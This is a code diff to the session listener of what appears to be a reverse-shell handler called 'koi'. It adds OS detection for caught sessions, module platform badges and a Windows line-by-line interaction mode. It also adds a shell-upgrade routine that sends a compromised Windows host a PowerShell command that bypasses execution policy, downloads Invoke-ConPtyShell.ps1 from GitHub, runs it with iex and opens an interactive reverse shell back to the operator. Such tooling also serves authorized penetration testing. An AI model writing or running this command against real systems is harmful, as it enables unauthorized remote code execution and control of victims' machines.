@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import os
+import queue
 import select
 import shutil
 import signal
@@ -18,11 +19,27 @@ from koi.utils.ui import (
     colored_text, display_art, print_report_box,
     breaker, notify, Spinner,
     PUMPKIN, WHITE, SILVER, CORAL,
-    _b, _c, _d, _gr, _p, _r, _y,
-    gradient_text,
+    _b, _bl, _c, _d, _gr, _p, _r, _y,
+    gradient_text, yesno, breaker_with_text
 )
 
 LOCALUSER = os.getenv("USER") or os.getenv("USERNAME") or "user"
+
+
+def _platform_badge(platform) -> str:
+    _LABELS = {
+        "linux":       _y("[linux]"),
+        "windows_cmd": _bl("[cmd]"),
+        "windows_ps":  _bl("[ps]"),
+        "any":         _gr("[any]"),
+    }
+    if isinstance(platform, list):
+        parts = "/".join(
+            {"linux": "linux", "windows_cmd": "cmd", "windows_ps": "ps"}.get(p, p)
+            for p in platform
+        )
+        return _bl(f"[{parts}]")
+    return _LABELS.get(platform, _gr(f"[{platform}]"))
 
 
 class Listener:
@@ -41,6 +58,8 @@ class Listener:
         self._in_session = False
         self._pending_notifications: list = []
         self._notif_lock = threading.Lock()
+        # ip -> os_type : sessions attendues par un upgrade ConPtyShell
+        self._pending_conpty: dict = {}
 
     def _add(self, conn, addr) -> Session:
         with self._id_lock:
@@ -73,16 +92,38 @@ class Listener:
                 break
 
             sess = self._add(conn, addr)
-            os.write(self._notify_w, b"1\n")
-            msg = f"{_b(_c(f'#{sess.id}'))}  {_c(addr[0])}{_gr(f':{addr[1]}')}"
-            if self._in_session:
-                with self._notif_lock:
-                    self._pending_notifications.append(('new', msg))
-            else:
-                sys.stdout.write(f"\r\033[K")
-                notify('new', msg)
-                sys.stdout.write(self._prompt())
-                sys.stdout.flush()
+
+            threading.Thread(
+                target=self._detect_and_notify,
+                args=(sess,),
+                daemon=True,
+                name=f"detect-{sess.id}",
+            ).start()
+
+    def _detect_and_notify(self, sess: Session) -> None:
+        # Session ConPtyShell attendue : pas besoin de sonder, l'OS est connu.
+        parent_os = self._pending_conpty.pop(sess.addr[0], None)
+        if parent_os is not None:
+            sess.os_type = parent_os
+        else:
+            from koi.detect import detect_os
+            detect_os(sess)
+
+        if not sess.alive:
+            return
+
+        os_tag = f" {_gr('[')} {sess.os_label()} {_gr(']')}" if sess.os_type else ""
+        msg = f"{_b(_c(f'#{sess.id}'))}  {_c(sess.addr[0])}{_gr(f':{sess.addr[1]}')}{os_tag}"
+        os.write(self._notify_w, b"1\n")
+
+        if self._in_session:
+            with self._notif_lock:
+                self._pending_notifications.append(('new', msg))
+        else:
+            sys.stdout.write(f"\r\033[K")
+            notify('new', msg)
+            sys.stdout.write(self._prompt())
+            sys.stdout.flush()
 
     def start(self):
         self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -231,7 +272,7 @@ class Listener:
             return
         data = {}
         for s in sorted(self._sessions.values(), key=lambda x: x.id):
-            key = f"#{s.id}  {s.status_dot()}  {_c(s.addr[0])}{_gr(f':{s.addr[1]}')}"
+            key = f"#{s.id}  {s.status_dot()}  {_c(s.addr[0])}{_gr(f':{s.addr[1]}')} [{s.os_label()}]"
             data[key] = s._uptime()
         print_report_box("Sessions", data)
 
@@ -252,6 +293,11 @@ class Listener:
             return
         if sess.upgraded:
             notify('warning', f"Session {_p(f'#{sid}')} is already upgraded.")
+            if not yesno("Do you want to try upgrading again?"):
+                return
+
+        if sess.os_type in ("windows_cmd", "windows_ps"):
+            self._upgrade_windows_conptyshell(sess)
             return
 
         with Spinner("Upgrading shell…"):
@@ -274,6 +320,72 @@ class Listener:
             sess.upgraded = True
 
         notify('success', f"Shell {_p(f'#{sid}')} upgraded successfully.")
+
+    _CONPTYSHELL_URL = (
+        "https://raw.githubusercontent.com/antonioCoco/ConPtyShell"
+        "/refs/heads/master/Invoke-ConPtyShell.ps1"
+    )
+
+    def _upgrade_windows_conptyshell(self, sess: Session) -> None:
+        try:
+            cols, rows = shutil.get_terminal_size()
+        except Exception:
+            cols, rows = 80, 24
+
+        local_ip = sess.conn.getsockname()[0]
+        if local_ip in ("0.0.0.0", ""):
+            local_ip = "127.0.0.1"
+
+        ps_cmd = (
+            f"iex(New-Object Net.WebClient).DownloadString('{self._CONPTYSHELL_URL}');"
+            f"Invoke-ConPtyShell -RemoteIp {local_ip} -RemotePort {self.port}"
+            f" -Rows {rows} -Cols {cols} -CommandLine powershell"
+        )
+        cmd = f"powershell -nop -ep bypass -c \"{ps_cmd}\"\r\n"
+
+        notify('info',
+            f"Sending ConPtyShell to session {_p(f'#{sess.id}')} → callback {_b(local_ip)}:{_b(self.port)}"
+        )
+
+        self._pending_conpty[sess.addr[0]] = sess.os_type
+        known_ids = set(self._sessions.keys())
+        sess.send(cmd.encode(sess.encoding, errors="replace"))
+
+        with Spinner("Waiting for ConPtyShell connection…"):
+            new_sess = self._wait_for_new_session(
+                expected_ip=sess.addr[0],
+                known_ids=known_ids,
+                timeout=30.0,
+            )
+
+        if new_sess is None:
+            notify('error', "ConPtyShell did not connect back in time.")
+            return
+
+        # Wait for OS detection to finish
+        deadline = time.monotonic() + 5.0
+        while new_sess.os_type is None and time.monotonic() < deadline:
+            time.sleep(0.1)
+
+        new_sess.upgraded = True
+        # Wake up the ConPtyShell PTY so it's ready to accept commands immediately
+        time.sleep(0.3)
+        new_sess.conn.sendall(b"\r\n")
+        notify('success',f"ConPtyShell ready as session {_p(f'#{new_sess.id}')}. ")
+
+    def _wait_for_new_session(
+        self,
+        expected_ip: str,
+        known_ids: set,
+        timeout: float = 30.0,
+    ) -> Optional[Session]:
+        deadline = time.monotonic() + timeout
+        while time.monotonic() < deadline:
+            time.sleep(0.2)
+            for sid, s in list(self._sessions.items()):
+                if sid not in known_ids and s.addr[0] == expected_ip:
+                    return s
+        return None
 
     def _cmd_kill(self, sid: int) -> None:
         sess = self._get(sid)
@@ -299,19 +411,36 @@ class Listener:
             return
 
         ip, port = sess.addr
+        is_windows_pty = sess.os_type in ("windows_cmd", "windows_ps") and sess.upgraded
+
         print()
         notify('info', f"Entering session {_b(_r(f'#{sid}'))} {_c(ip)}{_gr(f':{port}')}")
-        notify('status', _gr('Ctrl+Z to background  ·  Ctrl+C sends SIGINT to remote'))
+        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
+            notify('status', _gr('Ctrl+Z to background  ·  line-by-line mode'))
+        else:
+            notify('status', _gr('Ctrl+Z to background  ·  Ctrl+C sends SIGINT to remote'))
         print()
 
         if sess.upgraded:
-            self._sync_winsize(sess)
-            self._drain(sess, 0.3)
-            sess.send(b"\n")
-            time.sleep(0.15)
+            if not is_windows_pty:
+                self._sync_winsize(sess)
+                self._drain(sess, 0.3)
+                sess.send(b"\n")
+                time.sleep(0.15)
             signal.signal(signal.SIGWINCH, lambda *_: self._winch(sess))
 
+        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
+            sess.send(b"\r\n")
+            time.sleep(0.2)
+
         breaker()
+
+        # ConPtyShell sends absolute cursor-position sequences; clear the
+        # terminal first so they land on a blank canvas instead of on top of
+        # the messages printed above.
+        if is_windows_pty:
+            sys.stdout.write("\033[2J\033[H")
+            sys.stdout.flush()
 
         self._in_session = True
         reason = self._interact(sess)
@@ -345,10 +474,10 @@ class Listener:
             grouped = {}
             for name, cls in modules.items():
                 cat = cls.category or "Other"
-                grouped.setdefault(cat, {})[_p(name)] = cls.description
+                grouped.setdefault(cat, {})[_p(name)] = f"{cls.description}  {_platform_badge(cls.platform)}"
             print_report_box("Modules", grouped)
         else:
-            data = {_p(name): cls.description for name, cls in modules.items()}
+            data = {_p(name): f"{cls.description}  {_platform_badge(cls.platform)}" for name, cls in modules.items()}
             print_report_box("Modules", data)
 
     def _cmd_run(self, mod_name: str, sid: int, mod_args: list) -> None:
@@ -367,6 +496,12 @@ class Listener:
             available = ", ".join(load_modules().keys()) or "none"
             notify('error', f"Module {_p(mod_name)} not found.")
             notify('status', _gr(f"Available: {available}"))
+            return
+
+        if not mod_cls.supports(sess.os_type):
+            badge = _platform_badge(mod_cls.platform)
+            os_label = sess.os_label()
+            notify('error', f"Module {_p(mod_name)} {badge} is not compatible with session {_p(f'#{sid}')} ({os_label}).")
             return
 
         notify('info', f"Running module {_p(mod_name)} on session {_p(f'#{sid}')}…")
@@ -389,11 +524,16 @@ class Listener:
         gen = PayloadGenerator(port=self.port)
         if iface:
             payloads = gen.for_interface(iface)
+            print()
+            breaker_with_text(f"payloads for {iface}")
+            print()
             if payloads is None:
                 notify('error', f"Interface {_p(iface)} not found.")
                 notify('status', _gr("Available: " + ", ".join(gen.get_interfaces().keys())))
                 return
-            print_report_box(f"Payloads — {iface} ({gen.get_interfaces()[iface]})", payloads)
+            for name, payload in payloads.items():
+                print(f"{_b(_p(name))}: {_gr(payload)}\n")
+            breaker()
         else:
             all_payloads = gen.for_all()
             if not all_payloads:
@@ -434,10 +574,18 @@ class Listener:
         sess.send(f"stty rows {rows} cols {cols} 2>/dev/null\n".encode())
 
     def _winch(self, sess: Session) -> None:
+        if sess.os_type in ("windows_cmd", "windows_ps"):
+            return
         self._sync_winsize(sess)
         self._drain(sess, 0.15)
 
     def _interact(self, sess: Session) -> str:
+        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
+            return self._interact_windows(sess)
+        return self._interact_raw(sess)
+
+    def _interact_raw(self, sess: Session) -> str:
+        """Mode raw : pass-through complet, pour Linux PTY."""
         stop_event = threading.Event()
         result = ["backgrounded"]
 
@@ -485,6 +633,101 @@ class Listener:
                         break
             except OSError:
                 pass
+
+        stop_event.set()
+        recv_thread.join(timeout=1.0)
+        return result[0]
+
+    def _interact_windows(self, sess: Session) -> str:
+        """Mode line-by-line : pour les shells Windows request/response."""
+        enc = sess.encoding
+        stop_event = threading.Event()
+        result = ["backgrounded"]
+
+        # Thread qui affiche ce que la session renvoie
+        def _recv():
+            buf = b""
+            while not stop_event.is_set() and sess.alive:
+                try:
+                    r, _, _ = select.select([sess.conn], [], [], 0.1)
+                    if not r:
+                        continue
+                    data = sess.conn.recv(4096)
+                    if not data:
+                        sess.alive = False
+                        result[0] = "disconnected"
+                        stop_event.set()
+                        return
+                    buf += data
+                    text = buf.decode(enc, errors="replace")
+                    sys.stdout.write(text)
+                    sys.stdout.flush()
+                    buf = b""
+                except OSError:
+                    sess.alive = False
+                    result[0] = "disconnected"
+                    stop_event.set()
+
+        recv_thread = threading.Thread(target=_recv, daemon=True)
+        recv_thread.start()
+
+        time.sleep(0.3)
+
+        # Intercepter SIGTSTP (Ctrl+Z) pour background sans attendre Enter
+        old_sigtstp = signal.getsignal(signal.SIGTSTP)
+        def _handle_sigtstp(signum, frame):
+            result[0] = "backgrounded"
+            stop_event.set()
+        signal.signal(signal.SIGTSTP, _handle_sigtstp)
+
+        # Lire stdin dans un thread séparé via select pour ne pas bloquer
+        input_queue: queue.Queue = queue.Queue()
+
+        def _read_input():
+            while not stop_event.is_set():
+                try:
+                    r, _, _ = select.select([sys.stdin], [], [], 0.1)
+                    if r:
+                        line = sys.stdin.readline()
+                        if line:
+                            input_queue.put(line.rstrip('\n'))
+                        else:
+                            # EOF
+                            input_queue.put(None)
+                            return
+                except Exception:
+                    return
+
+        input_thread = threading.Thread(target=_read_input, daemon=True)
+        input_thread.start()
+
+        try:
+            while not stop_event.is_set() and sess.alive:
+                try:
+                    cmd = input_queue.get(timeout=0.1)
+                except queue.Empty:
+                    continue
+
+                if cmd is None:
+                    break
+
+                if cmd.strip().lower() in ("exit", "quit"):
+                    sess.send(b"exit\r\n")
+                    time.sleep(0.2)
+                    result[0] = "backgrounded"
+                    break
+
+                line = (cmd + "\r\n").encode(enc, errors="replace")
+                if not sess.send(line):
+                    result[0] = "disconnected"
+                    break
+
+                time.sleep(0.5)
+
+        except Exception:
+            pass
+        finally:
+            signal.signal(signal.SIGTSTP, old_sigtstp)
 
         stop_event.set()
         recv_thread.join(timeout=1.0)
